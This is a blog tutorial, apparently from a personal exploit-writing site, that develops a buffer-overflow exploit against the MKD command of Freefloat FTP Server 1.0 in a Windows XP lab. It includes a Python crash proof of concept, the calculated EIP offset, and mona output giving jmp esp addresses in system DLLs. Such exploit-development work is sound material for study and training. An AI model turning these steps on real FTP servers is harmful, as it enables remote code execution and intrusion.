---
layout:		post
title:		Freefloat FTP Server - 'MKD' Remote Buffer Overflow
author:		wooy0ung
tags:		windows
category:	exploit
---

- 目录
{:toc #markdown-toc}

>[Analysis Environment]  
>guest machine: Windows XP sp0 x86  
>host machine: Windows 10  
>necessary tools: Immunity Debugger[[here]](http://debugger.immunityinc.com/ID_register.py)、Mona.py、Metasploit Framework[[here]](http://www.metasploit.com/)  
<!-- more -->


## 0x001 Test POC

search POC on exploit-db
[Freefloat FTP Server 1.0 - 'DIR' Remote Buffer Overflow](https://www.exploit-db.com/exploits/40681/)

create ennough string by pattern.py
```
λ python pattern.py create 1000
```

copy this code to a new file, rename to poc.py
```
#!/usr/bin/python
 
import socket
import sys

#evil = "A"*1000
evil = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.1.14',21))

s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
```

execute poc.py, and application would crash
![](/assets/img/exploit/2018-08-03-freefloat-mkd-remote-buffer-overflow/0x001.png)

calculate distance
```
λ python pattern.py offset 0x69413269
0xf7
```


## 0x002 Exploit it!

list modules
```
> !mona findmsp
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x76ef0000 | 0x76f15000 | 0x00025000 | False  | False   | False |  False   | True   | 5.1.2600.0 [DNSAPI.dll] (C:\WINDOWS\System32\DNSAPI.dll)
 0x77e40000 | 0x77f4d000 | 0x0010d000 | False  | False   | False |  False   | True   | 5.1.2600.0 [kernel32.dll] (C:\WINDOWS\system32\kernel32.dll)
 0x77be0000 | 0x77c33000 | 0x00053000 | False  | False   | False |  False   | True   | 7.0.2600.0 [msvcrt.dll] (C:\WINDOWS\system32\msvcrt.dll)
 0x77f50000 | 0x77ff9000 | 0x000a9000 | False  | False   | False |  False   | True   | 5.1.2600.0 [ntdll.dll] (C:\WINDOWS\System32\ntdll.dll)
 0x71a00000 | 0x71a08000 | 0x00008000 | False  | False   | False |  False   | True   | 5.1.2600.0 [wshtcpip.dll] (C:\WINDOWS\System32\wshtcpip.dll)
 0x72f10000 | 0x72f6a000 | 0x0005a000 | False  | False   | False |  False   | True   | 1.0407.2600.0 [USP10.dll] (C:\WINDOWS\System32\USP10.dll)
 0x76f90000 | 0x76f95000 | 0x00005000 | False  | False   | False |  False   | True   | 5.1.2600.0 [rasadhlp.dll] (C:\WINDOWS\System32\rasadhlp.dll)
 0x71a10000 | 0x71a18000 | 0x00008000 | False  | False   | False |  False   | True   | 5.1.2600.0 [WS2HELP.dll] (
···
-----------------------------------------------------------------------------------------------------------------------------------------
```

find opcodes like "jmp esp" or "call esp"
```
> !mona jmp -r esp
-----------------------------------------------------------------------------------------------------------------------------------------
0x7731f05e : push esp # ret 0x08 |  {PAGE_EXECUTE_READ} [comctl32.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v5.82 (C:\WINDOWS\system32\comctl32.dll)
0x77f5801c : jmp esp |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v5.1.2600.0 (C:\WINDOWS\System32\ntdll.dll)
0x77f77343 : jmp esp |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v5.1.2600.0 (C:\WINDOWS\System32\ntdll.dll)
0x772f655f : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [SHLWAPI.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.2600.0000 (C:\WINDOWS\system32\SHLWAPI.dll)
0x77d4754a : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v5.1.2600.0 (C:\WINDOWS\system32\USER32.dll)
0x773a4540 : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [SHELL32.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.2600.0000 (C:\WINDOWS\system32\SHELL32.dll)
0x77523570 : jmp esp | asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [SHELL32.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.2600.0000 (C:\WINDOWS\system32\SHELL32.dll)
···
```

insert enough "int 3" breakpoint, observe where is the eip point to
![](/assets/img/exploit/2018-08-03-freefloat-mkd-remote-buffer-overflow/0x002.png)
clearly, it point to 0x00c8fc2c, we organize our payload after "jmp esp" + "A"*8

conventially, we can pop up a dialog
![](/assets/img/exploit/2018-08-03-freefloat-mkd-remote-buffer-overflow/0x003.png)